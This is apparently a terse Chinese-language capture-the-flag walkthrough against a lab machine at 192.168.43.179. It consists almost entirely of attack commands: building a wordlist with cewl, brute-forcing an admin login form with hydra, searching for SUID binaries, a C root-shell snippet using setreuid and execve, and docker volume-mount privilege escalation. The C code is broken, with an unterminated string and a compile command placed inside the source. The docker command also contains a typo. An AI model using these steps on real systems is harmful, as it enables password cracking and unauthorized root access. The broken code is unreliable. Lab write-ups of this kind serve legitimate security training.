## 0x00

`cewl http://192.168.43.179/websec/`爬取页面所有的单词做成字典

`hydra -l contact@hacknos.com -P cewl.txt 192.168.43.179 http-post-form "/websec/admin:username=^USER^&password=^PASS^:Wrong email or password"` 超强爆破

## 0x01

```
find /usr/bin -type f -perm -u=s 2>/dev/null
```

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc,char *argv[])
{
setreuid(0,0);
execve("/bin/bash,NULL,NULL);
} 
gcc suid.c -o exp
```

**docker提权**

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`搞个容器先

```
dokcer images + ID 389fef711851
```

```
docker run -it -v /:/mbt +ID
```

